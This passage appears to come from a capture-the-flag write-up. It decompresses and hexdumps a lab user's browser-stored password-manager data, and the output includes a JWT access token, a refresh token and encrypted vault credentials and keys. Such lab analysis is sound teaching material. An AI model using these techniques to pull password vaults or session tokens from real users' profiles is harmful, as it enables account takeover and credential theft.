x00\x00\x00\x10\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffyandex.pl\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffyandex.ru\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffyandex.tj\x00\x00\x00\x00\x00\x00\x00\x13\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffyandex.tm\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffyandex.ua\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffyandex.uz\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xffS\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x1c\x00\x00\x80\x04\x00\xff\xffsonyentertainmentnetwork.com\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffsony.com\x00\x00\x00\x00\x13\x00\xff\xffT\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffproton.me\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffprotonmail.com\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffprotonvpn.com\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xffU\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffubisoft.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffubi.com\x00\x00\x00\x00\x00\x13\x00\xff\xffV\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xfftransferwise.com\x01\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffwise.com\x00\x00\x00\x00\x13\x00\xff\xffW\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xfftakeaway.com\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffjust-eat.dk\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffjust-eat.no\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffjust-eat.fr\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffjust-eat.ch\x00\x00\x00\x00\x00\x05\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xfflieferando.de\x00\x00\x00\x06\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xfflieferando.at\x00\x00\x00\x07\x00\x00\x00\x03\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffthuisbezorgd.nl\x00\x08\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffpyszne.pl\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xffX\x00\x00\x00\x03\x00\xff\xff\x06\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffatlassian.com\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffbitbucket.org\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xfftrello.com\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffstatuspage.io\x00\x00\x00\x04\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffatlassian.net\x00\x00\x00\x05\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffjira.com\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffavatarColor\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffserverConfig\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffversion\x00\x00\x00\x00\x00\x01\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffgitHash\x00\x00\x00\x00\x00\x01\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xffserver\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffutcDate\x00\x18\x00\x00\x80\x04\x00\xff\xff2023-04-13T15:39:48.560Z\x0b\x00\x00\x80\x04\x00\xff\xffenvironment\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xfftokens\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffaccessToken\x00\x00\x00\x00\x00\xa3\x03\x00\x80\x04\x00\xff\xffeyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYmYiOjE2ODE0MDA0MjksImV4cCI6MTY4MTQwNzYyOSwiaXNzIjoiaHR0cDovL2xvY2FsaG9zdHxsb2dpbiIsInN1YiI6IjA4YjM3NTFiLWFhZDUtNDYxNi1iMWY3LTAxNWQzYmU3NDlkYiIsInByZW1pdW0iOnRydWUsIm5hbWUiOiJFbHdpbiBKb25lcyIsImVtYWlsIjoiZWx3aW4uam9uZXNAY29ycG9yYXRlLmh0YiIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJvcmdvd25lciI6W10sIm9yZ2FkbWluIjpbXSwib3JndXNlciI6W10sIm9yZ21hbmFnZXIiOltdLCJzc3RhbXAiOiI4YzIyZjg1OS0wNWNkLTQ1NDAtOTE1MS1lNTBlZDRmNDFhMTciLCJkZXZpY2UiOiJkYWY2ZTQwNy00MzU2LTRjMmQtODdkNi02YjRkYzkxNTUyMTQiLCJzY29wZSI6WyJhcGkiLCJvZmZsaW5lX2FjY2VzcyJdLCJhbXIiOlsiQXBwbGljYXRpb24iXX0.SgYJMoiBnuVhFMSElJ0PJdzc71ivD8KdXjuYeACNoibkEiYTbmgquLgYzj5i3uYpJKW8Q4zpTLdh7kfcX88xQCRG0UK6TpQXD2KiN3IvTEsmgjODLozVP_TRELBCw3hfgOuiagcoeqzFQFHnZ9pRW23EKjCVYtIS4qt6EQjIz-zIjOlnOzSe3RBD29ID4MQ77rFUnT_s0t5OJpqzAbGli-zrtspsz0_hRliyuvpyFJJRT1Ql3-fF8pr5U_iU1tsT-1uhCY3tO_1blWk81wkkjZX75BgAX9YmNkQtGR11Nk_g16SVYSxi0QkrBQ0CFdQiKbPtOGhWuc747ZdMbfWYVw\x00\x00\x00\x00\x00\x0c\x00\x00\x80\x04\x00\xff\xffrefreshToken\x00\x00\x00\x00X\x00\x00\x80\x04\x00\xff\xffEtZOWBXMx8WFucPxNUg5-Wm-uqCK-5h5Ujb07AT46hj64p1ySxMOb0gusNu_1Nu65PGNTYe2HS3UWynkTn2s5g==\x00\x00\x00\x00\x13\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffgroupings\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffcollectionCounts\x00\x00\x00\x00\x00\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xfffolderCounts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xfftypeCounts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xfffavoriteCiphers\x00\x00\x00\x00\x00\x01\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffnoFolderCiphers\x00\x00\x00\x00\x00\x01\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffciphers\x00\x00\x00\x00\x00\x01\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xfffolders\x00\x00\x00\x00\x00\x01\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x04\x00\x00\x80\x04\x00\xff\xffsend\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xfftypeCounts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x05\x00\x00\x80\x04\x00\xff\xffsends\x00\x00\x00\x00\x00\x00\x00\x01\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffciphers\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffsendType\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff'

```

![image-20240710095624970](/img/image-20240710095624970.png)

There also seem to be strings that might identify what each item is. Another nice way to look at it is with the [hexdump](https://pypi.org/project/hexdump/) module:

```

>>> hexdump.hexdump(snappy.decompress(data))
00000000: 03 00 00 00 00 00 F1 FF  00 00 00 00 08 00 FF FF  ................
00000010: 04 00 00 80 04 00 FF FF  64 61 74 61 00 00 00 00  ........data....
00000020: 00 00 00 00 08 00 FF FF  07 00 00 80 04 00 FF FF  ................
00000030: 63 69 70 68 65 72 73 00  00 00 00 00 08 00 FF FF  ciphers.........
00000040: 09 00 00 80 04 00 FF FF  65 6E 63 72 79 70 74 65  ........encrypte
00000050: 64 00 00 00 00 00 00 00  00 00 00 00 08 00 FF FF  d...............
00000060: 24 00 00 80 04 00 FF FF  35 35 33 34 66 36 61 37  $.......5534f6a7
00000070: 2D 31 38 30 66 2D 34 30  65 30 2D 62 66 30 38 2D  -180f-40e0-bf08-
00000080: 65 63 31 37 35 37 36 35  31 64 64 66 00 00 00 00  ec1757651ddf....
00000090: 00 00 00 00 08 00 FF FF  02 00 00 80 04 00 FF FF  ................
000000A0: 69 64 00 00 00 00 00 00  24 00 00 80 04 00 FF FF  id......$.......
000000B0: 35 35 33 34 66 36 61 37  2D 31 38 30 66 2D 34 30  5534f6a7-180f-40
000000C0: 65 30 2D 62 66 30 38 2D  65 63 31 37 35 37 36 35  e0-bf08-ec175765
000000D0: 31 64 64 66 00 00 00 00  0E 00 00 80 04 00 FF FF  1ddf............
000000E0: 6F 72 67 61 6E 69 7A 61  74 69 6F 6E 49 64 00 00  organizationId..
000000F0: 00 00 00 00 00 00 FF FF  08 00 00 80 04 00 FF FF  ................
00000100: 66 6F 6C 64 65 72 49 64  00 00 00 00 00 00 FF FF  folderId........
00000110: 04 00 00 80 04 00 FF FF  65 64 69 74 00 00 00 00  ........edit....
00000120: 01 00 00 00 02 00 FF FF  0C 00 00 80 04 00 FF FF  ................
00000130: 76 69 65 77 50 61 73 73  77 6F 72 64 00 00 00 00  viewPassword....
00000140: 01 00 00 00 02 00 FF FF  13 00 00 80 04 00 FF FF  ................
00000150: 6F 72 67 61 6E 69 7A 61  74 69 6F 6E 55 73 65 54  organizationUseT
00000160: 6F 74 70 00 00 00 00 00  01 00 00 00 02 00 FF FF  otp.............
00000170: 08 00 00 80 04 00 FF FF  66 61 76 6F 72 69 74 65  ........favorite
00000180: 00 00 00 00 02 00 FF FF  0C 00 00 80 04 00 FF FF  ................
00000190: 72 65 76 69 73 69 6F 6E  44 61 74 65 00 00 00 00  revisionDate....
000001A0: 1B 00 00 80 04 00 FF FF  32 30 32 33 2D 30 34 2D  ........2023-04-
000001B0: 31 33 54 31 34 3A 34 39  3A 34 36 2E 33 35 37 39  13T14:49:46.3579
000001C0: 37 39 5A 00 00 00 00 00  04 00 00 80 04 00 FF FF  79Z.............
000001D0: 74 79 70 65 00 00 00 00  01 00 00 00 03 00 FF FF  type............
000001E0: 04 00 00 80 04 00 FF FF  6E 61 6D 65 00 00 00 00  ........name....
000001F0: 60 00 00 80 04 00 FF FF  32 2E 51 52 46 39 76 49  `.......2.QRF9vI
00000200: 43 51 72 44 65 48 39 2F  70 37 4F 30 77 44 47 67  CQrDeH9/p7O0wDGg
00000210: 3D 3D 7C 67 4E 4A 50 78  35 46 64 49 66 39 77 73  ==|gNJPx5FdIf9ws
00000220: 66 72 79 37 47 2F 41 61  41 3D 3D 7C 4B 62 30 34  fry7G/AaA==|Kb04
00000230: 67 75 6A 35 67 6E 46 51  65 64 56 45 55 2F 57 78  guj5gnFQedVEU/Wx
00000240: 59 53 35 44 44 50 48 47  45 49 75 32 2B 5A 58 67  YS5DDPHGEIu2+ZXg
00000250: 31 55 55 4E 7A 41 73 3D  05 00 00 80 04 00 FF FF  1UUNzAs=........
00000260: 6E 6F 74 65 73 00 00 00  00 00 00 00 00 00 FF FF  notes...........
00000270: 0D 00 00 80 04 00 FF FF  63 6F 6C 6C 65 63 74 69  ........collecti
00000280: 6F 6E 49 64 73 00 00 00  00 00 00 00 07 00 FF FF  onIds...........
00000290: 00 00 00 00 13 00 FF FF  0C 00 00 80 04 00 FF FF  ................
000002A0: 63 72 65 61 74 69 6F 6E  44 61 74 65 00 00 00 00  creationDate....
000002B0: 1B 00 00 80 04 00 FF FF  32 30 32 33 2D 30 34 2D  ........2023-04-
000002C0: 31 33 54 31 34 3A 34 39  3A 34 36 2E 33 35 37 38  13T14:49:46.3578
000002D0: 30 38 5A 00 00 00 00 00  0B 00 00 80 04 00 FF FF  08Z.............
000002E0: 64 65 6C 65 74 65 64 44  61 74 65 00 00 00 00 00  deletedDate.....
000002F0: 00 00 00 00 00 00 FF FF  08 00 00 80 04 00 FF FF  ................
00000300: 72 65 70 72 6F 6D 70 74  00 00 00 00 03 00 FF FF  reprompt........
00000310: 05 00 00 80 04 00 FF FF  6C 6F 67 69 6E 00 00 00  ........login...
00000320: 00 00 00 00 08 00 FF FF  08 00 00 80 04 00 FF FF  ................
00000330: 75 73 65 72 6E 61 6D 65  60 00 00 80 04 00 FF FF  username`.......
00000340: 32 2E 56 32 61 68 44 75  67 43 31 37 68 44 63 73  2.V2ahDugC17hDcs
00000350: 31 44 58 54 75 53 49 51  3D 3D 7C 68 6A 62 74 63  1DXTuSIQ==|hjbtc
00000360: 68 35 66 6D 53 72 6E 51  79 30 45 35 44 62 38 57  h5fmSrnQy0E5Db8W
00000370: 51 3D 3D 7C 55 30 50 59  6C 73 34 59 63 35 6E 53  Q==|U0PYls4Yc5nS
00000380: 34 4A 6A 2F 34 57 77 36  32 4E 77 55 48 4A 56 54  4Jj/4Ww62NwUHJVT
00000390: 57 4F 66 73 4E 2F 59 34  52 59 41 71 4F 48 4D 3D  WOfsN/Y4RYAqOHM=
000003A0: 08 00 00 80 04 00 FF FF  70 61 73 73 77 6F 72 64  ........password
000003B0: 74 00 00 80 04 00 FF FF  32 2E 49 70 68 33 36 71  t.......2.Iph36q
000003C0: 6D 43 6F 6D 61 69 73 77  4C 62 31 34 57 6C 41 41  mComaiswLb14WlAA
000003D0: 3D 3D 7C 50 49 4B 43 70  5A 55 6A 55 61 68 78 49  ==|PIKCpZUjUahxI
000003E0: 5A 44 59 38 35 41 33 6C  47 33 49 4A 76 75 77 4E  ZDY85A3lG3IJvuwN
000003F0: 4B 37 69 6A 4C 50 49 30  62 4F 73 39 77 6F 3D 7C  K7ijLPI0bOs9wo=|
00000400: 65 78 77 34 65 6A 57 67  6A 2B 4A 34 4A 4D 76 56  exw4ejWgj+J4JMvV
00000410: 65 56 4E 52 5A 41 41 45  6C 2B 41 45 42 61 39 76  eVNRZAAEl+AEBa9v
00000420: 33 74 32 46 73 41 62 72  4B 35 30 3D 00 00 00 00  3t2FsAbrK50=....
00000430: 14 00 00 80 04 00 FF FF  70 61 73 73 77 6F 72 64  ........password
00000440: 52 65 76 69 73 69 6F 6E  44 61 74 65 00 00 00 00  RevisionDate....
00000450: 00 00 00 00 00 00 FF FF  04 00 00 80 04 00 FF FF  ................
00000460: 74 6F 74 70 00 00 00 00  B4 00 00 80 04 00 FF FF  totp............
00000470: 32 2E 6C 6F 55 75 74 57  6F 55 50 37 77 42 78 44  2.loUutWoUP7wBxD
00000480: 75 58 6C 50 2F 35 45 51  3D 3D 7C 73 53 39 56 55  uXlP/5EQ==|sS9VU
00000490: 65 6B 55 34 70 39 75 65  68 76 62 6B 37 6A 67 68  ekU4p9uehvbk7jgh
000004A0: 70 6E 71 34 38 6E 77 68  58 53 44 30 36 41 35 55  pnq48nwhXSD06A5U
000004B0: 4C 47 4C 73 48 36 6C 61  77 2F 51 4B 66 69 58 4D  LGLsH6law/QKfiXM
000004C0: 6D 59 79 79 38 36 38 31  63 49 57 53 57 52 37 50  mYyy8681cIWSWR7P
000004D0: 47 4B 75 2F 55 70 55 4F  49 35 34 61 78 52 64 62  GKu/UpUOI54axRdb
000004E0: 4F 6A 39 69 64 56 48 59  49 38 6A 47 32 78 41 5A  Oj9idVHYI8jG2xAZ
000004F0: 2F 37 6A 67 71 63 3D 7C  76 4E 5A 33 5A 39 45 58  /7jgqc=|vNZ3Z9EX
00000500: 45 37 2F 42 78 30 47 37  41 68 63 33 76 36 36 66  E7/Bx0G7Ahc3v66f
00000510: 37 39 73 6C 6F 46 43 70  51 57 69 51 4A 76 39 68  79sloFCpQWiQJv9h
00000520: 4E 62 34 3D 00 00 00 00  12 00 00 80 04 00 FF FF  Nb4=............
00000530: 61 75 74 6F 66 69 6C 6C  4F 6E 50 61 67 65 4C 6F  autofillOnPageLo
00000540: 61 64 00 00 00 00 00 00  00 00 00 00 00 00 FF FF  ad..............
00000550: 04 00 00 80 04 00 FF FF  75 72 69 73 00 00 00 00  ........uris....
00000560: 01 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00000570: 00 00 00 00 08 00 FF FF  05 00 00 80 04 00 FF FF  ................
00000580: 6D 61 74 63 68 00 00 00  00 00 00 00 00 00 FF FF  match...........
00000590: 03 00 00 80 04 00 FF FF  75 72 69 00 00 00 00 00  ........uri.....
000005A0: 74 00 00 80 04 00 FF FF  32 2E 46 6C 43 54 42 61  t.......2.FlCTBa
000005B0: 58 62 78 64 6D 70 62 65  4F 6B 63 36 73 56 56 51  XbxdmpbeOkc6sVVQ
000005C0: 3D 3D 7C 37 48 4B 53 58  2F 38 30 41 73 5A 33 6B  ==|7HKSX/80AsZ3k
000005D0: 68 6B 41 50 47 75 36 4B  4C 39 46 72 72 53 31 53  hkAPGu6KL9FrrS1S
000005E0: 74 32 43 67 73 67 78 70  62 41 62 35 67 34 3D 7C  t2CgsgxpbAb5g4=|
000005F0: 41 39 46 38 56 6D 78 76  34 4E 6C 4E 4B 72 42 6B  A9F8Vmxv4NlNKrBk
00000600: 55 6C 6C 32 34 6D 73 37  38 67 41 39 77 52 4B 4D  Ull24ms78gA9wRKM
00000610: 79 63 33 63 56 76 49 67  48 53 6F 3D 00 00 00 00  yc3cVvIgHSo=....
00000620: 00 00 00 00 13 00 FF FF  00 00 00 00 13 00 FF FF  ................
00000630: 00 00 00 00 13 00 FF FF  00 00 00 00 13 00 FF FF  ................
00000640: 00 00 00 00 13 00 FF FF  00 00 00 00 13 00 FF FF  ................
00000650: 07 00 00 80 04 00 FF FF  66 6F 6C 64 65 72 73 00  ........folders.
00000660: 00 00 00 00 08 00 FF FF  09 00 00 80 04 00 FF FF  ................
00000670: 65 6E 63 72 79 70 74 65  64 00 00 00 00 00 00 00  encrypted.......
00000680: 00 00 00 00 08 00 FF FF  00 00 00 00 13 00 FF FF  ................
00000690: 00 00 00 00 13 00 FF FF  05 00 00 80 04 00 FF FF  ................
000006A0: 73 65 6E 64 73 00 00 00  00 00 00 00 08 00 FF FF  sends...........
000006B0: 09 00 00 80 04 00 FF FF  65 6E 63 72 79 70 74 65  ........encrypte
000006C0: 64 00 00 00 00 00 00 00  00 00 00 00 08 00 FF FF  d...............
000006D0: 00 00 00 00 13 00 FF FF  00 00 00 00 13 00 FF FF  ................
000006E0: 0B 00 00 80 04 00 FF FF  63 6F 6C 6C 65 63 74 69  ........collecti
000006F0: 6F 6E 73 00 00 00 00 00  00 00 00 00 08 00 FF FF  ons.............
00000700: 09 00 00 80 04 00 FF FF  65 6E 63 72 79 70 74 65  ........encrypte
00000710: 64 00 00 00 00 00 00 00  00 00 00 00 08 00 FF FF  d...............
00000720: 00 00 00 00 13 00 FF FF  00 00 00 00 13 00 FF FF  ................
00000730: 08 00 00 80 04 00 FF FF  70 6F 6C 69 63 69 65 73  ........policies
00000740: 00 00 00 00 08 00 FF FF  09 00 00 80 04 00 FF FF  ................
00000750: 65 6E 63 72 79 70 74 65  64 00 00 00 00 00 00 00  encrypted.......
00000760: 00 00 00 00 08 00 FF FF  00 00 00 00 13 00 FF FF  ................
00000770: 00 00 00 00 13 00 FF FF  19 00 00 80 04 00 FF FF  ................
00000780: 70 61 73 73 77 6F 72 64  47 65 6E 65 72 61 74 69  passwordGenerati
00000790: 6F 6E 48 69 73 74 6F 72  79 00 00 00 00 00 00 00  onHistory.......
000007A0: 00 00 00 00 08 00 FF FF  00 00 00 00 13 00 FF FF  ................
000007B0: 0D 00 00 80 04 00 FF FF  6F 72 67 61 6E 69 7A 61  ........organiza
000007C0: 74 69 6F 6E 73 00 00 00  00 00 00 00 08 00 FF FF  tions...........
000007D0: 00 00 00 00 13 00 FF FF  09 00 00 80 04 00 FF FF  ................
000007E0: 70 72 6F 76 69 64 65 72  73 00 00 00 00 00 00 00  providers.......
000007F0: 00 00 00 00 08 00 FF FF  00 00 00 00 13 00 FF FF  ................
00000800: 00 00 00 00 13 00 FF FF  04 00 00 80 04 00 FF FF  ................
00000810: 6B 65 79 73 00 00 00 00  00 00 00 00 08 00 FF FF  keys............
00000820: 12 00 00 80 04 00 FF FF  63 72 79 70 74 6F 53 79  ........cryptoSy
00000830: 6D 6D 65 74 72 69 63 4B  65 79 00 00 00 00 00 00  mmetricKey......
00000840: 00 00 00 00 08 00 FF FF  09 00 00 80 04 00 FF FF  ................
00000850: 65 6E 63 72 79 70 74 65  64 00 00 00 00 00 00 00  encrypted.......
00000860: B4 00 00 80 04 00 FF FF  32 2E 50 31 4C 71 74 30  ........2.P1Lqt0
00000870: 53 78 31 52 32 43 51 74  52 4E 6B 4D 66 35 66 67  Sx1R2CQtRNkMf5fg
00000880: 3D 3D 7C 65 43 6F 4B 4B  33 72 4C 4F 46 44 72 2B  ==|eCoKK3rLOFDr+
00000890: 68 6B 45 4D 6E 4D 58 74  30 4A 56 63 48 71 50 58  hkEMnMXt0JVcHqPX
000008A0: 43 75 6A 72 47 56 69 73  2B 47 79 77 31 46 72 31  CujrGVis+Gyw1Fr1
000008B0: 45 33 67 53 63 2F 76 6D  6D 68 37 2F 47 76 78 71  E3gSc/vmmh7/Gvxq
000008C0: 35 58 74 72 6D 38 77 31  51 67 77 53 31 2F 49 50  5Xtrm8w1QgwS1/IP
000008D0: 51 47 45 78 65 6F 78 66  7A 50 67 43 61 54 35 45  QGExeoxfzPgCaT5E
000008E0: 37 68 69 33 61 39 62 36  39 61 36 56 41 59 3D 7C  7hi3a9b69a6VAY=|
000008F0: 36 35 64 64 75 6D 69 37  57 73 77 67 54 30 59 46  65ddumi7WswgT0YF
00000900: 79 6A 5A 2B 70 41 68 6A  76 62 44 30 38 61 2B 46  yjZ+pAhjvbD08a+F
00000910: 76 31 35 76 34 72 4F 34  50 67 63 3D 00 00 00 00  v15v4rO4Pgc=....
00000920: 00 00 00 00 13 00 FF FF  10 00 00 80 04 00 FF FF  ................
00000930: 6F 72 67 61 6E 69 7A 61  74 69 6F 6E 4B 65 79 73  organizationKeys
00000940: 00 00 00 00 08 00 FF FF  09 00 00 80 04 00 FF FF  ................
00000950: 65 6E 63 72 79 70 74 65  64 00 00 00 00 00 00 00  encrypted.......
00000960: 00 00 00 00 08 00 FF FF  00 00 00 00 13 00 FF FF  ................
00000970: 00 00 00 00 13 00 FF FF  0C 00 00 80 04 00 FF FF  ................
00000980: 70 72 6F 76 69 64 65 72  4B 65 79 73 00 00 00 00  providerKeys....
00000990: 00 00 00 00 08 00 FF FF  09 00 00 80 04 00 FF FF  ................
000009A0: 65 6E 63 72 79 70 74 65  64 00 00 00 00 00 00 00  encrypted.......
000009B0: 00 00 00 00 08 00 FF FF  00 00 00 00 13 00 FF FF  ................
000009C0: 00 00 00 00 13 00 FF FF  0A 00 00 80 04 00 FF FF  ................
000009D0: 70 72 69 76 61 74 65 4B  65 79 00 00 00 00 00 00  privateKey......
000009E0: 00 00 00 00 08 00 FF FF  09 00 00 80 04 00 FF FF  ................
000009F0: 65 6E 63 72 79 70 74 65  64 00 00 00 00 00 00 00  encrypted.......
00000A00: B4 06 00 80 04 00 FF FF  32 2E 78 64 4D 59 32 37  ........2.xdMY27
00000A10: 4D 68 50 32 6A 52 6D 75  44 4F 2F 52 6A 64 78 77  MhP2jRmuDO/Rjdxw
00000A20: 3D 3D 7C 50 75 54 43 6A  66 6A 36 30 65 58 35 66  ==|PuTCjfj60eX5f
00000A30: 51 38 34 75 4D 59 35 6D  36 32 74 49 2F 34 67 38  Q84uMY5m62tI/4g8
00000A40: 4A 64 38 35 45 64 4F 2F  31 59 65 46 52 59 4E 36  Jd85EdO/1YeFRYN6
00000A50: 68 77 4B 53 73 65 56 4A  33 78 62 51 39 31 4E 4C  hwKSseVJ3xbQ91NL
00000A60: 31 4E 66 58 6C 46 32 33  4F 36 69 74 46 73 69 6F  1NfXlF23O6itFsio
00000A70: 6F 63 74 45 32 55 75 30  71 7A 71 74 71 7A 4B 6B  octE2Uu0qzqtqzKk
00000A80: 30 47 74 33 4C 78 6A 4E  65 58 73 67 30 77 49 37  0Gt3LxjNeXsg0wI7
00000A90: 59 48 73 69 50 45 63 38  56 49 6A 6E 41 69 5A 34  YHsiPEc8VIjnAiZ4
00000AA0: 61 4B 66 74 4F 4B 4C 61  2B 4E 43 6B 63 46 4E 4A  aKftOKLa+NCkcFNJ
00000AB0: 4D 6E 45 72 71 36 76 41  44 48 65 64 49 48 79 54  MnErq6vADHedIHyT
00000AC0: 62 69 75 32 78 71 34 35  70 47 75 30 72 4E 58 7A  biu2xq45pGu0rNXz
00000AD0: 69 35 39 62 50 6E 4F 79  77 75 6E 77 6D 5A 57 32  i59bPnOywunwmZW2
00000AE0: 30 54 71 59 4E 58 61 49  66 39 2B 73 57 6F 33 48  0TqYNXaIf9+sWo3H
00000AF0: 76 66 65 41 52 4A 4C 66  34 70 35 39 7A 50 5A 44  vfeARJLf4p59zPZD
00000B00: 32 53 34 31 47 6D 6F 75  75 30 65 63 4B 56 42 72  2S41Gmouu0ecKVBr
00000B10: 49 58 4D 33 65 34 66 2B  67 63 59 52 68 43 71 56  IXM3e4f+gcYRhCqV
00000B20: 38 32 45 6A 75 72 6E 41  68 72 51 4F 74 32 4B 69  82EjurnAhrQOt2Ki
00000B30: 58 51 74 33 75 39 4E 6C  2F 7A 44 38 4B 64 53 75  XQt3u9Nl/zD8KdSu
00000B40: 47 7A 6C 56 78 6F 63 39  4F 44 59 37 50 49 41 56  GzlVxoc9ODY7PIAV
00000B50: 7A 56 50 6A 61 42 54 4A  44 65 6F 54 71 2F 7A 58  zVPjaBTJDeoTq/zX
00000B60: 36 36 7A 7A 35 71 30 39  31 52 4E 49 38 4B 56 4D  66zz5q091RNI8KVM
00000B70: 67 6A 37 6B 4C 66 30 33  4B 70 51 39 50 6A 6E 6C  gj7kLf03KpQ9Pjnl
00000B80: 5A 63 32 4A 65 59 4F 51  34 79 57 6F 70 4C 5A 33  Zc2JeYOQ4yWopLZ3
00000B90: 38 31 74 31 57 4F 47 67  65 53 2F 69 33 49 62 34  81t1WOGgeS/i3Ib4
00000BA0: 30 65 6B 45 35 53 44 49  6B 33 33 47 6A 50 74 4D  0ekE5SDIk33GjPtM
00000BB0: 37 2B 63 54 31 48 46 33  32 59 6C 62 59 49 39 6D  7+cT1HF32YlbYI9m
00000BC0: 77 45 48 57 54 6E 34 79  4D 50 35 4D 44 6B 56 53  wEHWTn4yMP5MDkVS
00000BD0: 38 2B 45 6A 5A 75 37 5A  4F 76 54 63 69 37 76 2F  8+EjZu7ZOvTci7v/
00000BE0: 37 4E 30 78 32 43 6F 4B  30 34 2F 42 36 76 59 6E  7N0x2CoK04/B6vYn
00000BF0: 45 67 5A 44 42 57 68 70  35 74 33 66 66 7A 4C 45  EgZDBWhp5t3ffzLE
00000C00: 75 37 57 39 38 43 34 70  2B 71 4B 46 55 46 34 78  u7W98C4p+qKFUF4x
